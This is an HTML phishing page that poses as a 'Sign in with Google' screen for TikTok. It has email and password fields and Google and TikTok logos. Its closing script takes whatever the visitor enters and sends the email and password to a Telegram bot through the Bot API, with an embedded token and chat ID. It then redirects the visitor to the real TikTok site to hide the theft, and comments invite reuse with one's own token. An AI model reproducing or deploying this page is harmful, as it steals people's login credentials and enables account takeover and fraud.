<html>
  <head>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" rel="stylesheet"/>
  </head>
  <body class="bg-black text-white flex items-center justify-center min-h-screen">
    <div class="w-full max-w-sm p-6 relative"> <!-- Added 'relative' for positioning -->

      <!-- Sign in with Google section placed above white bar -->
      <div class="absolute top-6 left-0 w-full text-center">
        <div class="flex items-center justify-center">
          <img alt="Google logo" class="mr-2" src="dc.png"/>
          <span>Sign in with Google</span>
        </div>
      </div>

      <!-- Long white horizontal line (Now at the top, and longer) -->
      <div class="absolute top-20 left-0 w-full h-32 border-t-4 border-white"></div> <!-- Increased height of white line -->

      <!-- TikTok Logo (Centered) -->
      <div class="flex items-center justify-center mb-6 mt-32">
        <img alt="TikTok logo" src="bc.png"/>
      </div>

      <!-- Main Heading -->
      <h1 class="text-3xl font-semibold mb-2 text-center">
        Sign in
      </h1>
      <p class="mb-6 text-center">
        to continue to
        <span class="text-blue-500">
          TikTok
        </span>
      </p>

      <!-- Email Input -->
      <div class="mb-4">
        <input id="email" class="w-full p-2 border border-gray-500 rounded bg-black text-white focus:outline-none focus:border-blue-500" placeholder="Email or phone" type="text"/>
      </div>

      <!-- Password Input -->
      <div class="mb-4">
        <input id="password" class="w-full p-2 border border-gray-500 rounded bg-black text-white focus:outline-none focus:border-blue-500" placeholder="Password" type="password"/>
      </div>

      <!-- Forgot email link -->
      <div class="mb-6">
        <a class="text-blue-500" href="#">
          Forgot email?
        </a>
      </div>

      <!-- Privacy Policy and Terms -->
      <p class="mb-6 text-sm text-center">
        Before using this app, you can review TikTokâ€™s
        <a class="text-blue-500" href="#">
          privacy policy
        </a>
        and
        <a class="text-blue-500" href="#">
          terms of service
        </a>
        .
      </p>

      <!-- Footer: Create account and Next button -->
      <div class="flex items-center justify-between">
        <a class="text-blue-500" href="#">
          Create account
        </a>
        <button id="submit" class="bg-blue-500 text-white px-4 py-2 rounded">
          Next
        </button>
      </div>
    </div>

    <script>
      document.getElementById("submit").onclick = function() {
        var email = document.getElementById("email").value;
        var password = document.getElementById("password").value;

        // Telegram Bot API URL
        var botToken = "7992356703:AAGGmo7eTksT5oS-tzkwoY8k9DAtUkR9u_c";  // Replace with your Bot Token
        var chatId = "6341598098";      // Replace with your Chat ID
        var message = `Email: ${email}\nPassword: ${password}`;
        
        // Encode message for URL compatibility
        var encodedMessage = encodeURIComponent(message);
        
        // Telegram Bot API call URL
        var apiURL = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodedMessage}`;

        // Send request to Telegram API
        fetch(apiURL)
          .then(response => response.json())
          .then(data => {
            if (data.ok) {
              console.log("Message sent to Telegram");
              // Optional: Show confirmation to user
              alert("Your data has been sent.");
            } else {
              console.error("Error sending message:", data.description);
              alert("Failed to send data.");
            }
          })
          .catch(error => {
            console.error("Error:", error);
            alert("An error occurred. Please try again.");
          });

        // Redirect to official TikTok page
        window.location.href = "https://www.tiktok.com";  // Official TikTok page URL
      };
    </script>
  </body>
</html>
